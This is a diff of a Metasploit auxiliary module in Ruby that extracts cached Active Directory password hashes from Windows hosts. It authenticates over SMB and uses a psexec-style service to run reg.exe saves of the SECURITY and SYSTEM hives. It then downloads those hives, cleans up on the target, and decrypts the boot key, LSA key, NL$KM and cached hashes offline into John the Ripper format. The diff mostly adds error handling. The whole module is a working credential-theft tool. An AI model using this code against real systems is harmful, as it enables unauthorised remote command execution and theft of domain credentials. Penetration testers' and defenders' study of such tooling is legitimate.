@@ -1,29 +1,21 @@
 #!/usr/bin/env ruby
-
 require 'msf/core'
-require 'rex'
 require 'rex/registry'
 require 'fileutils'
-require 'msf/core/post/windows/registry'
 
 class Metasploit3 < Msf::Auxiliary
 
 	# Exploit mixins should be called first
+	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
 	include Msf::Exploit::Remote::SMB::Authenticated
+
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
-	include Msf::Exploit::Remote::DCERPC
-
-	# Aliases for common classes
-	SIMPLE = Rex::Proto::SMB::SimpleClient
-	XCEPT  = Rex::Proto::SMB::Exceptions
-	CONST  = Rex::Proto::SMB::Constants
 
 	def initialize
 		super(
 			'Name'        => 'SMB - Extract Domain Cached Hashes',
-			'Version'     => '$Revision: 14976 $',
 			'Description' => %Q{
 				This module extracts cached AD user account password hashes from the SECURITY and SYSTEM hive files by authenticating
 				to the target machine and downloading a copy of the hives.  The hashes are extracted offline on the attacking machine.  This all happenes without popping a shell or uploading
@@ -32,13 +24,9 @@ class Metasploit3 < Msf::Auxiliary
 			},
 			'Author'      =>
 				[
-					'Royce Davis <rdavis[at]accuvant.com>',
-					'Twitter: <[at]R3dy__>',
-
+					'Royce @R3dy__ Davis <rdavis[at]accuvant.com>',
 				],
 			'References'  => [
-				['URL', 'http://www.pentestgeek.com'],
-				['URL', 'http://www.accuvant.com'],
 				['URL', 'http://sourceforge.net/projects/smbexec/']
 			],
 			'License'     => MSF_LICENSE
@@ -51,15 +39,12 @@ class Metasploit3 < Msf::Auxiliary
 		], self.class)
 
 		deregister_options('RHOST')
-		datastore['LOGDIR'] += "#{Time.new.strftime("%Y-%m-%d-%H%M%S")}"
-
+		#datastore['LOGDIR'] += "#{Time.new.strftime("%Y-%m-%d-%H%M%S")}"
 	end
 
 
 
-	#------------------------------------
 	# This is the main control method
-	#----------------------------------
 	def run_host(ip)
 		credentials = Rex::Ui::Text::Table.new(
 		'Header'    => "MSCACHE Credentials",
@@ -88,13 +73,7 @@ class Metasploit3 < Msf::Auxiliary
 		smbshare = datastore['SMBSHARE']
 		logdir = datastore['LOGDIR']
 
-		#Try and Connect to the target
-		begin
-			connect()
-		rescue StandardError => connecterror
-			return
-		end
-
+		connect()
 		#Try and authenticate with given credentials
 		begin
 			smb_login()
@@ -103,49 +82,41 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 
-		begin
-			simple.connect(smbshare)
-			save_reg_hives(smbshare, ip, secpath, syspath)
-			print_status("#{ip} - Downloading SYSTEM and SECURITY hive files.")
-			download_hives(smbshare, ip, syspath, secpath, logdir)
-			cleanup_after(smbshare, ip, secpath, syspath)
+		if save_reg_hives(smbshare, ip, secpath, syspath)
+			d = download_hives(smbshare, ip, syspath, secpath, logdir)
 			sys, sec = open_hives(logdir, ip)
-			dump_cache_creds(sec, sys, ip, credentials)
-			simple.connect(smbshare)
-			disconnect()
-		rescue StandardError => bang
-			disconnect()
-			return
+			if d
+				dump_cache_creds(sec, sys, ip, credentials)
+			end
 		end
+		cleanup_after(smbshare, ip, secpath, syspath)
+		disconnect()
 	end
 
 
 
-	#--------------------------------------------------------------------------------------------------------
 	# This method attempts to use reg.exe to generate copies of the SYSTEM, and SECURITY registry hives
 	# and store them in the Windows Temp directory on the remote host
-	#--------------------------------------------------------------------------------------------------------
 	def save_reg_hives(smbshare, ip, secpath, syspath)
 		print_status("Creating hive copies on #{ip}")
 		begin
 			# Try to save the hive files
+			simple.connect(smbshare)
 			command = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C reg.exe save HKLM\\SECURITY C:\\WINDOWS\\Temp\\#{secpath} && reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\#{syspath}"
 			psexec(smbshare, command)
+			return true
 		rescue StandardError => saveerror
-			print_error("Unable to create hive copies on #{ip}")
-			print_error("#{saveerror.class}: #{saveerror}")
-			disconnect()
-			return saveerror
+			print_error("#{ip} - Unable to create hive copies. #{saveerror}")
+			return false
 		end
 	end
 
 
 
-	#-----------------------------------------------------------------------------
 	# Method used to copy hive files from C:\WINDOWS\Temp* on the remote host
 	# To the local file path specified in datastore['LOGDIR'] on attacking system
-	#-----------------------------------------------------------------------------
 	def download_hives(smbshare, ip, syspath, secpath, logdir)
+		print_status("#{ip} - Downloading SYSTEM and SECURITY hive files.")
 		begin
 			newdir = "#{logdir}/#{ip}"
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
@@ -158,8 +129,8 @@ class Metasploit3 < Msf::Auxiliary
 			sysdata = remotesys.read
 
 			# Save it to local file system
-			localsec = File.open("#{logdir}/#{ip}/sec", "w+")
-			localsys = File.open("#{logdir}/#{ip}/sys", "w+")
+			localsec = File.open("#{logdir}/#{ip}/sec", "wb+")
+			localsys = File.open("#{logdir}/#{ip}/sys", "wb+")
 			localsec.write(secdata)
 			localsys.write(sysdata)
 
@@ -168,31 +139,32 @@ class Metasploit3 < Msf::Auxiliary
 			remotesec.close
 			remotesys.close
 			simple.disconnect("\\\\#{ip}\\#{smbshare}")
+			return true
 		rescue StandardError => copyerror
 			print_error("#{ip} - Unable to download hive copies from. #{copyerror}")
-			simple.disconnect("\\\\#{ip}\\#{smbshare}")
-			return copyerror
+			return false
 		end
 	end
 
 
 
-	#-------------------------------------------------------------------------------------------------------
 	# This method should hopefully open up a hive file from yoru local system and allow interacting with it
-	#-------------------------------------------------------------------------------------------------------
 	def open_hives(path, ip)
-		print_status("#{ip} - Opening hives on the local Attack system")
-		sys = Rex::Registry::Hive.new("#{path}/#{ip}/sys")
-		sec = Rex::Registry::Hive.new("#{path}/#{ip}/sec")
-		return sys, sec
+		begin
+			print_status("#{ip} - Opening hives on the local Attack system")
+			sys = Rex::Registry::Hive.new("#{path}/#{ip}/sys")
+			sec = Rex::Registry::Hive.new("#{path}/#{ip}/sec")
+			return sys, sec
+		rescue StandardError => openerror
+			print_error("#{ip} - Unable to open hives.  May not have downloaded properly. #{openerror}")
+			return nil, nil
+		end
 	end
 
 
 
-	#-------------------------------------------------------------------------------------------------------------
 	# This method runs the cleanup commands that delete the SYSTEM and SECURITY hive copies from the WINDOWS\Temp
 	# directory on the target host
-	#-------------------------------------------------------------------------------------------------------------
 	def cleanup_after(smbshare, ip, secpath, syspath)
 		print_status("Running cleanup on #{ip}")
 		begin
@@ -210,71 +182,71 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#-------------------------------------------------------
 	# Extracts the Domain Cached hashes from the hive files
-	#-------------------------------------------------------
 	def dump_cache_creds(sec, sys, ip, credentials)
 		print_status("#{ip} - Extracting Domain Cached Password hashes.")
 		bootkey = get_boot_key(sys, ip)
-		lsa_key = get_lsa_key(sec, bootkey)
-		nlkm = get_nlkm(sec, lsa_key)
-		begin
-			print_status("Dumping cached credentials...")
-			ok = sec.relative_query('\Cache')
-			john = ""
-			ok.value_list.values.each do |usr|
-				if( "NL$Control" == usr.name) then
-					next
-				end
-				begin
-					nl = usr.value.data
-				rescue
-					next
-				end
-				cache = parse_cache_entry(nl)
-				if ( cache.userNameLength > 0 )
-					print_status("Reg entry: #{nl.unpack("H*")[0]}") if( datastore['DEBUG'] )
-					print_status("Encrypted data: #{cache.enc_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
-					print_status("Ch:  #{cache.ch.unpack("H*")[0]}") if( datastore['DEBUG'] )
-					if( @vista == 1 )
-						dec_data = decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)
-					else
-						dec_data = decrypt_hash(cache.enc_data, nlkm, cache.ch)
+		lsa_key = get_lsa_key(sec, bootkey, ip)
+		nlkm = get_nlkm(sec, lsa_key, ip)
+		if bootkey && lsa_key && nlkm
+			begin
+				print_status("Dumping cached credentials...")
+				ok = sec.relative_query('\Cache')
+				john = ""
+				ok.value_list.values.each do |usr|
+					if( "NL$Control" == usr.name) then
+						next
 					end
-					print_status("Decrypted data: #{dec_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
-					john += parse_decrypted_cache(dec_data, cache, credentials)
+					begin
+						nl = usr.value.data
+					rescue
+						next
+					end
+					cache = parse_cache_entry(nl)
+					if ( cache.userNameLength > 0 )
+						print_status("Reg entry: #{nl.unpack("H*")[0]}") if( datastore['DEBUG'] )
+						print_status("Encrypted data: #{cache.enc_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
+						print_status("Ch:  #{cache.ch.unpack("H*")[0]}") if( datastore['DEBUG'] )
+						if( @vista == 1 )
+							dec_data = decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)
+						else
+							dec_data = decrypt_hash(cache.enc_data, nlkm, cache.ch)
+						end
+						print_status("Decrypted data: #{dec_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
+						john += parse_decrypted_cache(dec_data, cache, credentials)
+					end
 				end
+				print_status("John the Ripper format:")
+				john.split("\n").each do |pass|
+					print_good("#{pass}  -  #{ip}")
+				end
+				if( @vista == 1 )
+					vprint_status("Hash are in MSCACHE_VISTA format. (mscash2)")
+				else
+					vprint_status("Hash are in MSCACHE format. (mscash)")
+				end
+			rescue StandardError => e
+				print_status("No cached hashes found on #{ip}")
 			end
-			print_status("John the Ripper format:")
-			john.split("\n").each do |pass|
-				print_good("#{pass}  -  #{ip}")
-			end
-			if( @vista == 1 )
-				vprint_status("Hash are in MSCACHE_VISTA format. (mscash2)")
-			else
-				vprint_status("Hash are in MSCACHE format. (mscash)")
-			end
-		rescue StandardError => e
-			print_status("No cached hashes found on #{ip}")
 		end
-
 	end
 
 
-	#-----------------------------------------------------------------
 	# Extract the NLKM value from the SECURITY hive using the Lsa key
-	#-----------------------------------------------------------------
-	def get_nlkm(sec, lsa_key)
-		nlkm = sec.relative_query('\Policy\Secrets\NL$KM\CurrVal').value_list.values[0].value.data
-		decrypted = decrypt_secret( nlkm[0xC..-1], lsa_key )
-		return decrypted
+	def get_nlkm(sec, lsa_key, ip)
+		begin
+			nlkm = sec.relative_query('\Policy\Secrets\NL$KM\CurrVal').value_list.values[0].value.data
+			decrypted = decrypt_secret( nlkm[0xC..-1], lsa_key )
+			return decrypted
+		rescue StandardError => nlkmerror
+			print_error("#{ip} - Error extracting NLKM value from SECURITY hive. #{nlkmerror}")
+			return nil
+		end
 	end
 
 
 
-	#------------------------
 	# Decrypt a single hash
-	#------------------------
 	def decrypt_hash(edata, nlkm, ch)
 		rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest::Digest.new('md5'), nlkm, ch)
 		rc4 = OpenSSL::Cipher::Cipher.new("rc4")
@@ -287,9 +259,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
-	#----------------------------------------------------
 	def parse_decrypted_cache(dec_data, s, credentials)
 
 		i = 0
@@ -411,9 +381,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
-	#----------------------------------------------------
 	def parse_cache_entry(cache_data)
 		j = Struct.new(
 			:userNameLength,
@@ -482,9 +450,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
-	#----------------------------------------------------
 	def convert_des_56_to_64(kstr)
 		des_odd_parity = [
 			1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
@@ -526,9 +492,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
-	#----------------------------------------------------
 	def decrypt_secret(secret, key)
 		# Ruby implementation of SystemFunction005
 		# the original python code has been taken from Credump
@@ -556,9 +520,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
-	#----------------------------------------------------
 	def decrypt_lsa(pol, encryptedkey)
 		sha256x = Digest::SHA256.new()
 		sha256x << encryptedkey
@@ -580,10 +542,8 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
-	#----------------------------------------------------
-	def get_lsa_key(sec, bootkey)
+	def get_lsa_key(sec, bootkey, ip)
 		begin
 			enc_reg_key = sec.relative_query('\Policy\PolSecretEncryptionKey')
 			obf_lsa_key = enc_reg_key.value_list.values[0].value.data
@@ -594,30 +554,33 @@ class Metasploit3 < Msf::Auxiliary
 			@vista = 1
 		end
 
-		if ( @vista == 1 )
-			lsa_key = decrypt_lsa(obf_lsa_key, bootkey)
-			lsa_key = lsa_key[68,32]
-		else
-			md5x = Digest::MD5.new()
-			md5x.update(bootkey)
-			(1..1000).each do
-				md5x.update(obf_lsa_key[60,76])
+		begin
+			if ( @vista == 1 )
+				lsa_key = decrypt_lsa(obf_lsa_key, bootkey)
+				lsa_key = lsa_key[68,32]
+			else
+				md5x = Digest::MD5.new()
+				md5x.update(bootkey)
+				(1..1000).each do
+					md5x.update(obf_lsa_key[60,76])
 				end
 
-			rc4 = OpenSSL::Cipher::Cipher.new("rc4")
-			rc4.key = md5x.digest()
-			lsa_key	= rc4.update(obf_lsa_key[12,60])
-			lsa_key << rc4.final
-			lsa_key = lsa_key[0x10..0x20]
+				rc4 = OpenSSL::Cipher::Cipher.new("rc4")
+				rc4.key = md5x.digest()
+				lsa_key	= rc4.update(obf_lsa_key[12,60])
+				lsa_key << rc4.final
+				lsa_key = lsa_key[0x10..0x20]
+			end
+			return lsa_key
+		rescue StandardError => lsaerror
+			print_error("#{ip} - Error getting LSA Key from SECURITY hive file. #{lsaerror}")
+			return nil
 		end
-		return lsa_key
 	end
 
 
 
-	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
-	#----------------------------------------------------
 	def get_boot_key(hive, ip)
 		begin
 			vprint_status("Getting boot key")
@@ -655,16 +618,14 @@ class Metasploit3 < Msf::Auxiliary
 			return scrambled
 		rescue StandardError => boot_key_error
 			print_error("#{ip} - Error extracting the boot key. #{boot_key_error}")
-			return boot_key_error
+			return nil
 		end
 	end
 
 
 
-	#------------------------------------------------------------------------------------------------------------------------
-	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
+	# This code was stolen straight out of psexec.rb.  Thanks very much HDM and all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
-	#------------------------------------------------------------------------------------------------------------------------
 	def psexec(smbshare, command)
 		filename = "filename"
 		servicename = "servicename"
